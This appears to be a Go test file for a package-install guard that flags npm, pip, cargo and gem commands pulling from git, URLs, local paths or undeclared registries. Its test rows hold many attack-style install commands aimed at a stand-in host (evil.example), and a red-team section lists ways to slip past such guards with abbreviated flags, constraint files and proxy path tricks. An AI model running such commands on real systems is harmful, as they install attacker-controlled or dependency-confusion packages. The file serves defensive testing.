package cli

// P0b of docs/PLANS_INTELLIGENCE.md#plan-non-registry-sources: install-guard
// command lines that name a git / URL / path source or an undeclared registry.
// Before the fix every row below scored the PUBLIC namesake, printed a clean
// allow, and the package manager then installed something else.

import (
	"bytes"
	"context"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/spf13/viper"

	"github.com/chain305/chainsaw-core/malware"
	"github.com/chain305/chainsaw-core/typosquat"
)

const testChainsawServer = "https://chainsaw.example/chainproxy"

// sourcesTestEnv isolates the guard from the developer's machine: no policy
// bundle, no real package caches, no network, a known server URL.
func sourcesTestEnv(t *testing.T) string {
	t.Helper()
	guardPolicyTestEnv(t, "")
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("CHAINSAW_OFFLINE", "1")
	t.Setenv("PIP_CACHE_DIR", filepath.Join(home, "pip"))
	t.Setenv("CARGO_HOME", filepath.Join(home, "cargo"))
	t.Setenv("npm_config_cache", filepath.Join(home, "npm"))
	t.Setenv("CHAINSAW_GUARD_DB", filepath.Join(home, "none.json"))
	t.Setenv("NO_COLOR", "1")
	prev, prevSlug := viper.GetString("server_url"), viper.GetString("org_slug")
	viper.Set("server_url", testChainsawServer)
	viper.Set("org_slug", "acme")
	t.Cleanup(func() { viper.Set("server_url", prev); viper.Set("org_slug", prevSlug) })
	return chdirTemp(t)
}

// sourcesGuard has no typosquat corpora (deterministic) and one
// whole-package known-malicious name, "evilpkg", in every ecosystem here.
func sourcesGuard() *localGuard {
	idx := malware.NewIndex(nil)
	var entries []*malware.OSVEntry
	for _, eco := range []string{"npm", "PyPI", "crates.io", "RubyGems"} {
		entries = append(entries, &malware.OSVEntry{
			ID:       "MAL-TEST-" + eco,
			Affected: []malware.OSVAffected{{Package: malware.OSVPackage{Ecosystem: eco, Name: "evilpkg"}}},
		})
	}
	entries = append(entries,
		&malware.OSVEntry{ID: "MAL-TEST-debug", Affected: []malware.OSVAffected{{Package: malware.OSVPackage{Ecosystem: "npm", Name: "debug"}, Versions: []string{"4.4.2"}}}},
		&malware.OSVEntry{ID: "MAL-TEST-evilver-npm", Affected: []malware.OSVAffected{{Package: malware.OSVPackage{Ecosystem: "npm", Name: "evilver"}, Versions: []string{"1.0.0"}}}},
		&malware.OSVEntry{ID: "MAL-TEST-evilver-pypi", Affected: []malware.OSVAffected{{Package: malware.OSVPackage{Ecosystem: "PyPI", Name: "evilver"}, Versions: []string{"1.0"}}}},
	)
	idx.Load(entries)
	return &localGuard{
		detectors: map[string]*typosquat.Detector{"npm": nil, "pip": nil, "pypi": nil, "cargo": nil, "rubygems": nil},
		malware:   idx,
	}
}

var sourceParsers = map[string]specParser{
	"npm": parseNpmInstall, "pip": parsePipInstall, "cargo": parseCargoInstall, "gem": parseGemInstall,
}

// looksLikeSource is a URL or path that was read as a registry package name.
func looksLikeSource(name string) bool {
	return strings.Contains(name, "://") || strings.Contains(name, ":") ||
		strings.HasPrefix(name, ".") || strings.HasPrefix(name, "/") || strings.Contains(name, "#")
}

type sourceCase struct {
	name  string
	bin   string
	args  []string
	files map[string]string // written into the cwd first
	want  string            // "not-assessed" | "local" | "confusion" | "registry" | "blocked"
	pkg   string            // the package the verdict is about ("" = no recoverable name)
	inOut string            // when set, the printed output must contain it
}

func runSourceCase(t *testing.T, c sourceCase) (specs []packageSpec, verdicts []guardVerdict, blocked bool, out string) {
	t.Helper()
	dir := sourcesTestEnv(t)
	for f, body := range c.files {
		mustWrite(t, filepath.Join(dir, f), body)
	}
	specs, recognized, _ := guardSpecsFor(c.bin, c.args, sourceParsers[c.bin])
	if !recognized {
		t.Fatalf("%s %v: not recognized as an install", c.bin, c.args)
	}
	for _, s := range specs {
		if s.Origin == "" && looksLikeSource(s.Name) {
			t.Errorf("%s %v: a URL/path was parsed as registry package %q", c.bin, c.args, s.Name)
		}
	}
	if c.want == "registry" {
		return specs, nil, false, ""
	}
	verdicts, blocked = sourcesGuard().evaluateAll(context.Background(), specs)
	var buf bytes.Buffer
	printGuardVerdicts(&buf, "chainsaw", verdicts, true)
	return specs, verdicts, blocked, buf.String()
}

func TestGuardCommandLineSources(t *testing.T) {
	cases := []sourceCase{
		// 1. npm
		{name: "npm github: spec", bin: "npm", args: []string{"install", "lodash@github:x/lodash"}, want: "not-assessed", pkg: "lodash"},
		{name: "npm git+https spec", bin: "npm", args: []string{"i", "lodash@git+https://github.com/x/lodash.git#v4"}, want: "not-assessed", pkg: "lodash"},
		{name: "npm tarball URL spec", bin: "npm", args: []string{"install", "lodash@https://evil.example/x.tgz"}, want: "not-assessed", pkg: "lodash"},
		{name: "npm file: spec", bin: "npm", args: []string{"install", "lodash@file:../x"}, want: "local", pkg: "lodash"},
		{name: "npm user/repo shorthand spec", bin: "npm", args: []string{"install", "lodash@x/lodash"}, want: "not-assessed", pkg: "lodash"},
		{name: "npm bare github:", bin: "npm", args: []string{"install", "github:x/repo"}, want: "not-assessed"},
		{name: "npm bare user/repo", bin: "npm", args: []string{"install", "x/repo"}, want: "not-assessed"},
		{name: "npm bare tarball URL", bin: "npm", args: []string{"install", "https://evil.example/x.tgz"}, want: "not-assessed"},
		{name: "npm bare git+ssh", bin: "npm", args: []string{"install", "git+ssh://git@github.com/x/repo.git"}, want: "not-assessed"},
		{name: "npm bare path", bin: "npm", args: []string{"install", "./local"}, want: "local"},
		{name: "npm --registry", bin: "npm", args: []string{"install", "--registry", "https://evil.example/", "lodash"}, want: "not-assessed", pkg: "lodash"},
		{name: "npm --registry=", bin: "npm", args: []string{"install", "--registry=https://evil.example/", "lodash"}, want: "not-assessed", pkg: "lodash"},
		{name: "npm scoped registry", bin: "npm", args: []string{"install", "--@acme:registry=https://evil.example/", "@acme/lib"}, want: "not-assessed", pkg: "@acme/lib"},

		// 2. pip
		{name: "pip name @ git", bin: "pip", args: []string{"install", "requests[socks] @ git+https://github.com/x/requests"}, want: "not-assessed", pkg: "requests"},
		{name: "pip git #egg", bin: "pip", args: []string{"install", "git+https://github.com/x/requests#egg=requests"}, want: "not-assessed", pkg: "requests"},
		{name: "pip git no name", bin: "pip", args: []string{"install", "git+https://github.com/x/y"}, want: "not-assessed"},
		{name: "pip local dir", bin: "pip", args: []string{"install", "./local"}, want: "local"},
		{name: "pip wheel URL", bin: "pip", args: []string{"install", "https://evil.example/requests-2.31.0-py3-none-any.whl"}, want: "not-assessed", pkg: "requests"},
		{name: "pip -i", bin: "pip", args: []string{"install", "-i", "https://evil.example/simple", "requests"}, want: "not-assessed", pkg: "requests"},
		{name: "pip -i attached", bin: "pip", args: []string{"install", "-ihttps://evil.example/simple", "requests"}, want: "not-assessed", pkg: "requests"},
		{name: "pip --index-url=", bin: "pip", args: []string{"install", "--index-url=https://evil.example/simple", "requests"}, want: "not-assessed", pkg: "requests"},
		{name: "pip -f", bin: "pip", args: []string{"install", "-f", "https://evil.example/links", "requests"}, want: "not-assessed", pkg: "requests"},
		{name: "pip --extra-index-url", bin: "pip", args: []string{"install", "--extra-index-url", "https://evil.example/simple", "requests"}, want: "confusion", pkg: "requests"},
		{name: "pip -e git", bin: "pip", args: []string{"install", "-e", "git+https://github.com/x/y#egg=thing"}, want: "not-assessed", pkg: "thing"},

		// 3. cargo
		{name: "cargo --git", bin: "cargo", args: []string{"install", "--git", "https://github.com/x/ripgrep", "ripgrep"}, want: "not-assessed", pkg: "ripgrep"},
		{name: "cargo --git, no crate", bin: "cargo", args: []string{"install", "--git", "https://github.com/x/tool"}, want: "not-assessed"},
		{name: "cargo --registry", bin: "cargo", args: []string{"install", "--registry", "myreg", "ripgrep"}, want: "not-assessed", pkg: "ripgrep"},
		{name: "cargo --index", bin: "cargo", args: []string{"install", "ripgrep", "--index", "https://evil.example/index"}, want: "not-assessed", pkg: "ripgrep"},
		{name: "cargo --path", bin: "cargo", args: []string{"install", "--path", "./tool"}, want: "local"},

		// 4. gem
		{name: "gem --source", bin: "gem", args: []string{"install", "--source", "https://evil.example/", "rails"}, want: "not-assessed", pkg: "rails"},
		{name: "gem -s", bin: "gem", args: []string{"install", "-s", "https://evil.example/", "rails"}, want: "not-assessed", pkg: "rails"},
		{name: "gem --clear-sources -s", bin: "gem", args: []string{"install", "--clear-sources", "-s", "https://evil.example/", "rails"}, want: "not-assessed", pkg: "rails"},

		// 5. requirements.txt
		{name: "req name @ url", bin: "pip", args: []string{"install", "-r", "req.txt"},
			files: map[string]string{"req.txt": "requests @ git+https://github.com/x/requests ; python_version >= '3'\n"}, want: "not-assessed", pkg: "requests"},
		{name: "req -e git", bin: "pip", args: []string{"install", "-r", "req.txt"},
			files: map[string]string{"req.txt": "-e git+https://github.com/x/y#egg=thing\n"}, want: "not-assessed", pkg: "thing"},
		{name: "req bare git", bin: "pip", args: []string{"install", "-r", "req.txt"},
			files: map[string]string{"req.txt": "git+https://github.com/x/y#egg=thing\n"}, want: "not-assessed", pkg: "thing"},
		{name: "req --index-url", bin: "pip", args: []string{"install", "-r", "req.txt"},
			files: map[string]string{"req.txt": "--index-url https://evil.example/simple\nrequests==2.31.0\n"}, want: "not-assessed", pkg: "requests"},
		{name: "req -f", bin: "pip", args: []string{"install", "-r", "req.txt"},
			files: map[string]string{"req.txt": "-f https://evil.example/links\nrequests==2.31.0\n"}, want: "not-assessed", pkg: "requests"},
		{name: "req --extra-index-url", bin: "pip", args: []string{"install", "-r", "req.txt"},
			files: map[string]string{"req.txt": "--extra-index-url https://evil.example/simple\nrequests==2.31.0\n"}, want: "confusion", pkg: "requests"},
		{name: "req -i applies to a named package too", bin: "pip", args: []string{"install", "-r", "req.txt", "requests"},
			files: map[string]string{"req.txt": "-i https://evil.example/simple\n"}, want: "not-assessed", pkg: "requests"},
		{name: "req --requirement= form", bin: "pip", args: []string{"install", "--requirement=req.txt"},
			files: map[string]string{"req.txt": "requests @ https://evil.example/r.whl\n"}, want: "not-assessed", pkg: "requests"},

		// The malware lane still runs on the name.
		{name: "npm malicious via git", bin: "npm", args: []string{"install", "evilpkg@github:x/evilpkg"}, want: "blocked", pkg: "evilpkg"},
		{name: "pip malicious via -i", bin: "pip", args: []string{"install", "-i", "https://evil.example/simple", "evilpkg"}, want: "blocked", pkg: "evilpkg"},
		{name: "pip malicious via name @ url", bin: "pip", args: []string{"install", "evilpkg @ https://evil.example/e.whl"}, want: "blocked", pkg: "evilpkg"},
		{name: "pip malicious via --extra-index-url", bin: "pip", args: []string{"install", "--extra-index-url", "https://evil.example/simple", "evilpkg"}, want: "blocked", pkg: "evilpkg"},
		{name: "cargo malicious via --git", bin: "cargo", args: []string{"install", "--git", "https://github.com/x/e", "evilpkg"}, want: "blocked", pkg: "evilpkg"},
		{name: "gem malicious via -s", bin: "gem", args: []string{"install", "-s", "https://evil.example/", "evilpkg"}, want: "blocked", pkg: "evilpkg"},
		{name: "req malicious via -e", bin: "pip", args: []string{"install", "-r", "req.txt"},
			files: map[string]string{"req.txt": "-e git+https://github.com/x/y#egg=evilpkg\n"}, want: "blocked", pkg: "evilpkg"},

		// The public registry and Chainsaw's own server are the registry.
		{name: "npm --registry npmjs", bin: "npm", args: []string{"install", "--registry", "https://registry.npmjs.org/", "lodash"}, want: "registry", pkg: "lodash"},
		{name: "npm --registry chainsaw", bin: "npm", args: []string{"install", "--registry", "https://chainsaw.example/chainproxy/repository/@acme/npmjs/", "lodash"}, want: "registry", pkg: "lodash"},
		{name: "pip -i pypi", bin: "pip", args: []string{"install", "-i", "https://pypi.org/simple", "requests"}, want: "registry", pkg: "requests"},
		{name: "pip -i chainsaw", bin: "pip", args: []string{"install", "-i", "https://chainsaw.example/chainproxy/repository/@acme/pypi/simple", "requests"}, want: "registry", pkg: "requests"},
		{name: "pip --extra-index-url chainsaw", bin: "pip", args: []string{"install", "--extra-index-url", "https://chainsaw.example/chainproxy/repository/@acme/pypi/simple", "requests"}, want: "registry", pkg: "requests"},
		{name: "cargo --registry crates-io", bin: "cargo", args: []string{"install", "--registry", "crates-io", "ripgrep"}, want: "registry", pkg: "ripgrep"},
		{name: "cargo --index sparse crates.io", bin: "cargo", args: []string{"install", "--index", "sparse+https://index.crates.io/", "ripgrep"}, want: "registry", pkg: "ripgrep"},
		{name: "cargo --index git crates.io", bin: "cargo", args: []string{"install", "--index", "https://github.com/rust-lang/crates.io-index", "ripgrep"}, want: "registry", pkg: "ripgrep"},
		{name: "gem -s rubygems", bin: "gem", args: []string{"install", "-s", "https://rubygems.org/", "rails"}, want: "registry", pkg: "rails"},
		{name: "gem -s chainsaw", bin: "gem", args: []string{"install", "-s", "https://chainsaw.example/chainproxy/repository/@acme/rubygems/", "rails"}, want: "registry", pkg: "rails"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) { checkSourceCase(t, c) })
	}
}

// checkSourceCase runs one row through guardSpecsFor -> evaluateAll ->
// printGuardVerdicts and asserts its expectation.
func checkSourceCase(t *testing.T, c sourceCase) {
	t.Helper()
	specs, verdicts, blocked, out := runSourceCase(t, c)
	if c.inOut != "" && !strings.Contains(out, c.inOut) {
		t.Errorf("output lacks %q:\n%s", c.inOut, out)
	}
	switch c.want {
	case "registry":
		var found bool
		for _, s := range specs {
			if s.Origin != "" || s.ExtraIndex != "" {
				t.Errorf("want a plain registry spec, got %+v", s)
			}
			found = found || s.Name == c.pkg
		}
		if !found {
			t.Errorf("no registry spec for %q in %+v", c.pkg, specs)
		}
	case "blocked":
		if !blocked || !strings.Contains(out, "blocked") || !strings.Contains(out, c.pkg) {
			t.Errorf("a known-malicious %q must still be refused, got blocked=%v:\n%s", c.pkg, blocked, out)
		}
	case "confusion":
		if blocked {
			t.Fatalf("not a refusal:\n%s", out)
		}
		if !strings.Contains(out, "dependency confusion: pip may install "+c.pkg+" from evil.example") {
			t.Errorf("want a dependency-confusion warning naming the extra index:\n%s", out)
		}
	case "not-assessed", "local":
		if blocked {
			t.Fatalf("not a refusal:\n%s", out)
		}
		var na bool
		for _, v := range verdicts {
			if v.Severity == "" && v.Spec.Origin == "" {
				t.Errorf("clean registry allow for %s: the namesake was scored, not what gets installed", v.Spec)
			}
			if v.Severity == guardSeverityNotAssessed && v.Spec.Name == c.pkg {
				na = true
				if c.want == "local" && !strings.Contains(v.Reason, "local path") {
					t.Errorf("a local path is reported as one: %q", v.Reason)
				}
			}
		}
		if !na || !strings.Contains(out, "? not assessed") {
			t.Errorf("want a visible not-assessed line for %q, got %+v\n%s", c.pkg, verdicts, out)
		}
	}
}

// TestGuardSourceCredentialsNeverPrinted: a token in a URL on the command line
// or in a requirements file must not reach the terminal or a CI log.
func TestGuardSourceCredentialsNeverPrinted(t *testing.T) {
	for _, c := range []sourceCase{
		{bin: "npm", args: []string{"install", "lodash@git+https://user:SECRET1@github.com/x/lodash.git"}},
		{bin: "npm", args: []string{"install", "--registry", "https://u:SECRET2@evil.example/", "lodash"}},
		{bin: "pip", args: []string{"install", "-i", "https://u:SECRET3@evil.example/simple", "requests"}},
		{bin: "pip", args: []string{"install", "--extra-index-url", "https://u:SECRET4@evil.example/simple", "requests"}},
		{bin: "pip", args: []string{"install", "git+https://u:SECRET5@github.com/x/y?token=SECRET6"}},
		{bin: "gem", args: []string{"install", "-s", "https://u:SECRET7@evil.example/", "rails"}},
		{bin: "cargo", args: []string{"install", "--git", "https://u:SECRET8@github.com/x/y", "ripgrep"}},
		{bin: "pip", args: []string{"install", "-r", "req.txt"}, files: map[string]string{"req.txt": "--extra-index-url https://u:SECRET9@evil.example/simple\nrequests\n"}},
		// Tokens in the PATH (Cloudsmith, Gemfury) and in file:// userinfo.
		{bin: "pip", args: []string{"install", "-i", "https://dl.cloudsmith.io/SECRETENT/acme/repo/python/simple/", "requests"}},
		{bin: "pip", args: []string{"install", "--extra-index-url", "https://pypi.fury.io/SECRETFURY/acme/", "requests"}},
		{bin: "pip", args: []string{"install", "file://u:SECRETFILE@host/x"}},
		{bin: "pip", args: []string{"install", "https://evil.example/SECRETWHL/x-1.0-py3-none-any.whl"}},
		{bin: "npm", args: []string{"install", "https://evil.example/SECRETTAR/x.tgz"}},
		{bin: "npm", args: []string{"install", "lodash@https://evil.example/SECRETTAR2/x.tgz"}},
		{bin: "gem", args: []string{"install", "-s", "https://evil.example/SECRETGEM/", "rails"}},
		{bin: "cargo", args: []string{"install", "--index", "https://evil.example/SECRETIDX/index", "ripgrep"}},
		{bin: "cargo", args: []string{"install", "--config", `registries.evil.index="https://u:SECRETCFG@evil.example/i"`, "ripgrep"}},
		{bin: "pip", args: []string{"install", "-r", "https://evil.example/SECRETREQ/req.txt"}},
	} {
		_, _, _, out := runSourceCase(t, c)
		if strings.Contains(out, "SECRET") {
			t.Errorf("%s %v leaked a credential:\n%s", c.bin, c.args, out)
		}
		if out == "" {
			t.Errorf("%s %v printed nothing", c.bin, c.args)
		}
	}
}

// TestGuardLocalOnlyStillScansTheTree: `pip install -e .` and
// `cargo install --path .` install the project's resolved tree as well, so
// naming only a local path must not switch the lockfile sweep off.
func TestGuardLocalOnlyStillScansTheTree(t *testing.T) {
	dir := sourcesTestEnv(t)
	mustWrite(t, filepath.Join(dir, "poetry.lock"), "[[package]]\nname = \"requests\"\nversion = \"2.31.0\"\n")
	specs, _, _ := guardSpecsFor("pip", []string{"install", "-e", "."}, parsePipInstall)
	var local, tree bool
	for _, s := range specs {
		local = local || (s.Name == "" && s.Origin != "")
		tree = tree || (s.Name == "requests" && s.Origin == "")
	}
	if !local || !tree {
		t.Errorf("want the local path line AND the lockfile tree, got %+v", specs)
	}
}

// TestGuardRedTeamP0b is the red-team review of the first P0b change: every
// row printed a clean allow (or lost a block) before its fix.
func TestGuardRedTeamP0b(t *testing.T) {
	evilIndex := "--index-url https://evil.example/simple\n"
	cases := []sourceCase{
		// 1. Abbreviated long options (optparse, nopt, OptionParser).
		{name: "pip --ind=", bin: "pip", args: []string{"install", "--ind=https://evil.example/simple", "requests"}, want: "not-assessed", pkg: "requests"},
		{name: "pip --index", bin: "pip", args: []string{"install", "--index", "https://evil.example/simple", "requests"}, want: "not-assessed", pkg: "requests"},
		{name: "pip --in", bin: "pip", args: []string{"install", "--in", "https://evil.example/simple", "requests"}, want: "not-assessed", pkg: "requests"},
		{name: "pip --pypi-url", bin: "pip", args: []string{"install", "--pypi-url", "https://evil.example/simple", "requests"}, want: "not-assessed", pkg: "requests"},
		{name: "pip --extra-index", bin: "pip", args: []string{"install", "--extra-index", "https://evil.example/simple", "requests"}, want: "confusion", pkg: "requests"},
		{name: "pip --extra", bin: "pip", args: []string{"install", "--extra", "https://evil.example/simple", "requests"}, want: "confusion", pkg: "requests"},
		{name: "pip --find", bin: "pip", args: []string{"install", "--find", "https://evil.example/links", "requests"}, want: "not-assessed", pkg: "requests"},
		{name: "pip --cons", bin: "pip", args: []string{"install", "--cons", "c.txt", "requests"}, files: map[string]string{"c.txt": evilIndex}, want: "not-assessed", pkg: "requests"},
		{name: "req file --index", bin: "pip", args: []string{"install", "-r", "req.txt"},
			files: map[string]string{"req.txt": "--index https://evil.example/simple\nrequests\n"}, want: "not-assessed", pkg: "requests"},
		{name: "req file --ex (unique in the req-file parser)", bin: "pip", args: []string{"install", "-r", "req.txt"},
			files: map[string]string{"req.txt": "--ex https://evil.example/simple\nrequests\n"}, want: "confusion", pkg: "requests"},
		{name: "npm --reg=", bin: "npm", args: []string{"install", "--reg=https://evil.example/", "lodash"}, want: "not-assessed", pkg: "lodash"},
		{name: "npm --regis", bin: "npm", args: []string{"install", "--regis", "https://evil.example/", "lodash"}, want: "not-assessed", pkg: "lodash"},
		{name: "gem --sou", bin: "gem", args: []string{"install", "--sou", "https://evil.example/", "rails"}, want: "not-assessed", pkg: "rails"},
		{name: "gem --so=", bin: "gem", args: []string{"install", "--so=https://evil.example/", "rails"}, want: "not-assessed", pkg: "rails"},
		// An abbreviated BOOLEAN must not swallow the package after it.
		{name: "npm --save-d is boolean", bin: "npm", args: []string{"install", "--save-d", "evilpkg"}, want: "blocked", pkg: "evilpkg"},
		{name: "pip --upg is ambiguous, never a value", bin: "pip", args: []string{"install", "--upg", "evilpkg"}, want: "blocked", pkg: "evilpkg"},

		// 2. "~" is a semver range, "~/" a path.
		{name: "npm x@~1.2.3", bin: "npm", args: []string{"install", "lodash@~4.17.0"}, want: "registry", pkg: "lodash"},
		{name: "npm debug@~4.4.2 admits malicious 4.4.2", bin: "npm", args: []string{"install", "debug@~4.4.2"}, want: "blocked", pkg: "debug"},
		{name: "npm x@~/dir is a path", bin: "npm", args: []string{"install", "lodash@~/dir"}, want: "local", pkg: "lodash"},

		// 3. Constraints files carry options too.
		{name: "pip -c switches the index", bin: "pip", args: []string{"install", "-c", "c.txt", "requests"}, files: map[string]string{"c.txt": evilIndex}, want: "not-assessed", pkg: "requests"},
		{name: "-c nested in -r", bin: "pip", args: []string{"install", "-r", "req.txt"},
			files: map[string]string{"req.txt": "-c c.txt\nrequests\n", "c.txt": evilIndex}, want: "not-assessed", pkg: "requests"},
		{name: "--build-constraint", bin: "pip", args: []string{"install", "--build-constraint", "c.txt", "requests"}, files: map[string]string{"c.txt": evilIndex}, want: "not-assessed", pkg: "requests"},

		// 4. Only the user's own org's proxy repositories are exempt.
		{name: "own org exempt", bin: "pip", args: []string{"install", "-i", "https://chainsaw.example/chainproxy/repository/@acme/pypi/simple", "requests"}, want: "registry", pkg: "requests"},
		{name: "other org", bin: "pip", args: []string{"install", "-i", "https://chainsaw.example/chainproxy/repository/@attacker/pypi/simple", "requests"}, want: "not-assessed", pkg: "requests"},
		{name: "other org via ..", bin: "pip", args: []string{"install", "-i", "https://chainsaw.example/chainproxy/repository/@acme/../@attacker/pypi/simple", "requests"}, want: "not-assessed", pkg: "requests"},
		{name: "other path on the host", bin: "pip", args: []string{"install", "-i", "https://chainsaw.example/elsewhere/simple", "requests"}, want: "not-assessed", pkg: "requests"},
		{name: "other port", bin: "npm", args: []string{"install", "--registry", "https://chainsaw.example:8443/chainproxy/repository/@acme/npmjs/", "lodash"}, want: "not-assessed", pkg: "lodash"},
		{name: "http not https", bin: "gem", args: []string{"install", "-s", "http://chainsaw.example/chainproxy/repository/@acme/rubygems/", "rails"}, want: "not-assessed", pkg: "rails"},

		// 7. Names recoverable from a URL get the malware lane.
		{name: "npm registry tarball URL", bin: "npm", args: []string{"install", "https://registry.npmjs.org/evilpkg/-/evilpkg-1.0.0.tgz"}, want: "blocked", pkg: "evilpkg"},
		{name: "npm x@tarball URL checks the URL's package", bin: "npm", args: []string{"install", "x@https://evil.example/evilver/-/evilver-1.0.0.tgz"}, want: "blocked", pkg: "evilver"},
		{name: "pip sdist URL", bin: "pip", args: []string{"install", "https://evil.example/evilver-1.0.tar.gz"}, want: "blocked", pkg: "evilver"},
		{name: "pip sdist zip", bin: "pip", args: []string{"install", "https://evil.example/files/evilpkg-2.0.zip"}, want: "blocked", pkg: "evilpkg"},
		{name: "pip wheel upper-case suffix", bin: "pip", args: []string{"install", "https://evil.example/evilver-1.0-py3-none-any.WHL"}, want: "blocked", pkg: "evilver"},
		{name: "pip GIT+HTTPS #egg", bin: "pip", args: []string{"install", "GIT+HTTPS://github.com/x/y#egg=evilpkg"}, want: "blocked", pkg: "evilpkg"},

		// ALSO
		{name: "pip -r URL", bin: "pip", args: []string{"install", "-r", "https://evil.example/req.txt"}, want: "not-assessed", pkg: ""},
		{name: "pip -r URL beside a named package", bin: "pip", args: []string{"install", "-r", "https://evil.example/req.txt", "requests"}, want: "not-assessed", pkg: "requests"},
		{name: "cargo --config source replace", bin: "cargo", args: []string{"install", "--config", `source.crates-io.replace-with="evil"`, "ripgrep"}, want: "not-assessed", pkg: "ripgrep"},
		{name: "cargo --config file", bin: "cargo", args: []string{"install", "--config", "evil.toml", "ripgrep"}, want: "not-assessed", pkg: "ripgrep"},
		{name: "cargo --config unrelated", bin: "cargo", args: []string{"install", "--config", "net.retry=2", "ripgrep"}, want: "registry", pkg: "ripgrep"},
		{name: "npm --userconfig", bin: "npm", args: []string{"install", "--userconfig", "./x.npmrc", "lodash"}, want: "not-assessed", pkg: "lodash", inOut: "--userconfig"},
		{name: "npm --usercon= (abbreviated)", bin: "npm", args: []string{"install", "--usercon=./x.npmrc", "lodash"}, want: "not-assessed", pkg: "lodash"},
		{name: "req line continuation", bin: "pip", args: []string{"install", "-r", "req.txt"},
			files: map[string]string{"req.txt": "--index-url \\\n    https://evil.example/simple\nrequests==2.31.0 \\\n    --hash=sha256:abc\n"}, want: "not-assessed", pkg: "requests"},
		{name: "req continuation inside a requirement", bin: "pip", args: []string{"install", "-r", "req.txt"},
			files: map[string]string{"req.txt": "evilpkg\\\n    ; python_version >= '3'\n"}, want: "blocked", pkg: "evilpkg"},
		{name: "npm bare FOO.TGZ is a local tarball", bin: "npm", args: []string{"install", "FOO.TGZ"}, want: "local", pkg: ""},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) { checkSourceCase(t, c) })
	}
}

// TestGuardSourcesRecoveredSpecs pins the recovered coordinates.
func TestGuardSourcesRecoveredSpecs(t *testing.T) {
	sourcesTestEnv(t)
	for _, c := range []struct {
		arg, name, version string
		registry           bool
	}{
		{"https://registry.npmjs.org/@scope/pkg/-/pkg-1.2.3.tgz", "@scope/pkg", "1.2.3", true},
		{"x@https://evil.example/evilver/-/evilver-1.0.0.tgz", "evilver", "1.0.0", false},
	} {
		specs, _, _ := guardSpecsFor("npm", []string{"install", c.arg}, parseNpmInstall)
		if len(specs) != 1 || specs[0].Name != c.name || specs[0].Version != c.version || (specs[0].Origin == "") != c.registry {
			t.Errorf("%s: got %+v, want %s@%s registry=%v", c.arg, specs, c.name, c.version, c.registry)
		}
	}
}

// TestRequirementsFanOutAndCycles: a file that includes itself ten times, and
// two files that include each other, are each read once.
func TestRequirementsFanOutAndCycles(t *testing.T) {
	dir := sourcesTestEnv(t)
	mustWrite(t, filepath.Join(dir, "r.txt"), strings.Repeat("-r r.txt\n", 10)+"requests\n")
	mustWrite(t, filepath.Join(dir, "a.txt"), "-r b.txt\nflask\n")
	mustWrite(t, filepath.Join(dir, "b.txt"), "-r a.txt\n-c a.txt\nclick\n")
	for _, f := range []string{"r.txt", "a.txt"} {
		done := make(chan []packageSpec, 1)
		go func() {
			specs, _, _ := guardSpecsFor("pip", []string{"install", "-r", f}, parsePipInstall)
			done <- specs
		}()
		select {
		case specs := <-done:
			if len(specs) > 2 {
				t.Errorf("%s: %d specs, want each file read once: %+v", f, len(specs), specs[:min(len(specs), 5)])
			}
		case <-time.After(5 * time.Second):
			t.Fatalf("%s: requirements expansion did not finish in 5s", f)
		}
	}
}

// TestCanonicalLongFlag: unique prefixes expand, ambiguous and exact ones do not.
func TestCanonicalLongFlag(t *testing.T) {
	for _, c := range []struct {
		fs       *flagSet
		in, want string
	}{
		{pipInstallFlags, "--in", "--index-url"},
		{pipInstallFlags, "--i", "--i"},
		{pipInstallFlags, "--upg", "--upg"},
		{pipInstallFlags, "--extra", "--extra-index-url"},
		{pipReqFileFlags, "--ex", "--extra-index-url"},
		{pipInstallFlags, "--ex", "--ex"},
		{npmFlags, "--reg", "--registry"},
		{npmFlags, "--re", "--re"},
		{npmFlags, "--save", "--save"},
		{gemFlags, "--sou", "--source"},
		{cargoFlags, "--ind", "--ind"}, // clap rejects prefixes
	} {
		if got := c.fs.canonical(c.in); got != c.want {
			t.Errorf("canonical(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}
